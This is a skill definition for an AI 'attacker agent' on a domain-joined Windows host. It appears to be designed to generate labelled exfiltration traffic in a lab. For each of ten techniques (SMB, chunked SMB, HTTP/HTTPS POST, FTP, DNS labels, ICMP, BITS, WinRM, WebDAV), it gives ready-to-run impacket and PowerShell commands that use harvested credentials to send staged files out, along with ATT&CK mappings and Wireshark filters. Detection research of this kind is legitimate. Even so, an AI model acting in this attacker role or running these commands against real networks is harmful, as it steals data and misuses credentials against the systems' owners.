---
name: ad-exfil
description: Exfiltration-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers SMB, chunked SMB, HTTP/HTTPS, FTP, DNS, ICMP, BITS, WinRM, and WebDAV to hosts already in state. Load this skill when the task names ad-exfil. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Exfiltration Skill

Load this skill **only** when the dispatched task names `ad-exfil`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

**Peer constraint.** Source files come from `files[]` or `campaign.staging_dir`. The peer is a host or DC already in `state` so SPAN can see packets. If the service is not listening, mark the technique `failed`. Do not stand up a new C2 server.

# Exfiltration

## 1. SMB Exfiltration

- Technique id: `exfil.smb`
- ATT&CK: T1048 (Exfiltration Over Alternative Protocol)

Purpose: upload a staged archive to an SMB share on a host in `state`.

Inputs: a file in `files[]` (prefer `collection.archive` output), a user object with `password` from `users`, and a host with `shares`.

Procedure (one atomic action):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside: `use <share>`, `put <local-archive> <remote-name>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<remote-unc>", "description": "exfil via SMB to <target-ip>"}'
```

Rollback: if the share is read-only, `mark-stale` shares and re-run `discovery.share-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 2. Chunked SMB

- Technique id: `exfil.chunked-smb`
- ATT&CK: T1030 (Data Transfer Size Limits)

Purpose: split a staged file and `put` chunks over SMB.

Inputs: a file in `files[]`, a user object with `password`, a host with `shares`.

Procedure (one atomic action — split locally, then one SMB session putting chunks):

```
powershell -c "$in='<local-file>'; $i=0; Get-Content $in -Encoding Byte -ReadCount 65536 | ForEach-Object { [IO.File]::WriteAllBytes(('<campaign.staging_dir>\chunk_{0:d3}.bin' -f $i++), $_) }"
```

Then `python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>`, `use <share>`, and `put` each `chunk_*.bin`.

Outputs:

```
python scripts/state.py add files '{"path": "<share>/chunk_000.bin", "description": "chunked SMB exfil to <target-ip>"}'
```

Rollback: re-split if a chunk put fails.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 3. HTTP POST

- Technique id: `exfil.http`
- ATT&CK: T1071.001 (Application Layer Protocol: Web Protocols)

Purpose: POST a staged file to `http://<target-ip>/` (a host already in `state`). Do not start a listener.

Inputs: a file in `files[]`, plus a target IP from `hosts[]` or `domain.dc_ip`.

Procedure (one atomic action):

```
powershell -c "Invoke-WebRequest -Uri 'http://<target-ip>/' -Method POST -InFile '<local-file>' -ContentType 'application/octet-stream'"
```

If the connection is refused, mark `failed`. That is an expected lab outcome.

Outputs:

```
python scripts/state.py add notes '{"text": "HTTP POST exfil of <local-file> to <target-ip>"}'
```

Rollback: retry once; then mark `failed`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (http || tcp.port == 80)
```


## 4. HTTPS

- Technique id: `exfil.https`
- ATT&CK: T1048.002 (Exfiltration Over Asymmetric Encrypted Non-C2 Protocol)

Purpose: POST or PUT a staged file to HTTPS on a host in `state` (port 443 or WinRM 5986).

Inputs: a file in `files[]`, plus a target from `hosts[]` (`open_ports` containing 443 or 5986 when known).

Procedure (one atomic action):

```
powershell -c "Invoke-WebRequest -Uri 'https://<target-ip>/' -Method POST -InFile '<local-file>' -SkipCertificateCheck"
```

If 443 is closed and 5986 is open, use `https://<target-ip>:5986/` instead. Connection refused → `failed`.

Outputs:

```
python scripts/state.py add notes '{"text": "HTTPS exfil of <local-file> to <target-ip>"}'
```

Rollback: retry the other TLS port once, then mark `failed`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (tls || ssl || tcp.port == 443 || tcp.port == 5986)
```


## 5. FTP

- Technique id: `exfil.ftp`
- ATT&CK: T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)

Purpose: upload a staged file to FTP on `<target-ip>:21`. Do not install an FTP server.

Inputs: a file in `files[]`, plus a target IP from `hosts[]`.

Procedure (one atomic action):

```
powershell -c "$r = [Net.FtpWebRequest]::Create('ftp://<target-ip>/<remote-name>'); $r.Method = [Net.WebRequestMethods+Ftp]::UploadFile; $r.UseBinary = $true; $b = [IO.File]::ReadAllBytes('<local-file>'); $s = $r.GetRequestStream(); $s.Write($b,0,$b.Length); $s.Close(); $r.GetResponse()"
```

Connection refused → `failed`.

Outputs:

```
python scripts/state.py add notes '{"text": "FTP exfil of <local-file> to <target-ip>"}'
```

Rollback: mark `failed` if port 21 is closed.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (ftp || tcp.port == 21)
```


## 6. DNS Queries

- Technique id: `exfil.dns`
- ATT&CK: T1048.001 (Exfiltration Over Symmetric Encrypted Non-C2 Protocol) / T1071.004

Purpose: send the staged file's name and hash as DNS labels to the DC. Do not implement a full DNS tunnel or malware implant.

Inputs: a file in `files[]`, plus `domain.name` and `domain.dc_ip`.

Procedure (one atomic action):

```
powershell -c "$h = (Get-FileHash '<local-file>' -Algorithm MD5).Hash.ToLower(); $n = (Split-Path '<local-file>' -Leaf) -replace '[^A-Za-z0-9]', ''; nslookup -type=TXT ($n + '.' + $h.Substring(0,32) + '.<domain.name>') <domain.dc_ip>"
```

Outputs:

```
python scripts/state.py add notes '{"text": "DNS label exfil of <filename>/hash to <dc-ip>"}'
```

Rollback: re-query if the DC IP is stale.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (dns || udp.port == 53 || tcp.port == 53)
```


## 7. ICMP

- Technique id: `exfil.icmp`
- ATT&CK: T1048 (Exfiltration Over Alternative Protocol)

Purpose: send oversized ICMP echo requests to a host in `state` (file-size/hash as count, not a custom implant).

Inputs: a file in `files[]` (used only for size/hash in the note), plus a target IP from `hosts[]` or `domain.dc_ip`.

Procedure (one atomic action):

```
ping -n 20 -l 1400 <target-ip>
```

Outputs:

```
python scripts/state.py add notes '{"text": "ICMP large-echo to <target-ip> for <local-file>"}'
```

Rollback: none; ICMP failure still produced packets.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && icmp
```


## 8. BITS Transfer

- Technique id: `exfil.bits`
- ATT&CK: T1197 (BITS Jobs)

Purpose: copy a staged file out with BITS to a host in `state` (HTTP URL or UNC share). Distinct from `persistence.bits-job` (callback persistence).

Inputs: a file in `files[]`, plus a target share or `http://<target-ip>/`.

Procedure (one atomic action):

```
powershell -c "Start-BitsTransfer -Source '<local-file>' -Destination '\\<target-ip>\C$\Windows\Temp\<name>' -TransferType Upload"
```

If the UNC fails, try `http://<target-ip>/<name>` as destination. Connection refused → `failed`.

Outputs:

```
python scripts/state.py add notes '{"text": "BITS exfil of <local-file> to <target-ip>"}'
```

Rollback: cancel leftover jobs with `bitsadmin /cancel`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || http || tcp.port == 445 || tcp.port == 80)
```


## 9. WinRM Copy

- Technique id: `exfil.winrm`
- ATT&CK: T1021.006 (Remote Services: Windows Remote Management)

Purpose: copy a staged file to a host over WinRM.

Inputs: a file in `files[]`, a user object with `password` from `users`, plus the target FQDN.

Procedure (one atomic action):

```
powershell -c "$p = ConvertTo-SecureString '<password>' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('<domain.name>\<user>', $p); $s = New-PSSession -ComputerName <target-fqdn> -Credential $c; Copy-Item -Path '<local-file>' -Destination 'C:\Windows\Temp\' -ToSession $s; Remove-PSSession $s"
```

Do not put the password in the task text — read it from `users` via `state.py`. If WinRM is closed, mark `failed`.

Outputs:

```
python scripts/state.py add notes '{"text": "WinRM copy of <local-file> to <target-fqdn>"}'
```

Rollback: retry once; then mark `failed`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (tcp.port == 5985 || tcp.port == 5986)
```


## 10. WebDAV

- Technique id: `exfil.webdav`
- ATT&CK: T1048 (Exfiltration Over Alternative Protocol)

Purpose: map a WebDAV URL on a host in `state` and copy a staged file.

Inputs: a file in `files[]`, plus a target IP/FQDN from `hosts[]`.

Procedure (one atomic action):

```
net use * http://<target-ip>/ && copy "<local-file>" "\\<target-ip>\DavWWWRoot\"
```

If WebDAV is not offered, mark `failed`. Do not install IIS.

Outputs:

```
python scripts/state.py add notes '{"text": "WebDAV copy of <local-file> to <target-ip>"}'
```

Rollback: `net use /delete` the mapping if it was created.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (http || webdav || tcp.port == 80 || tcp.port == 443)
```
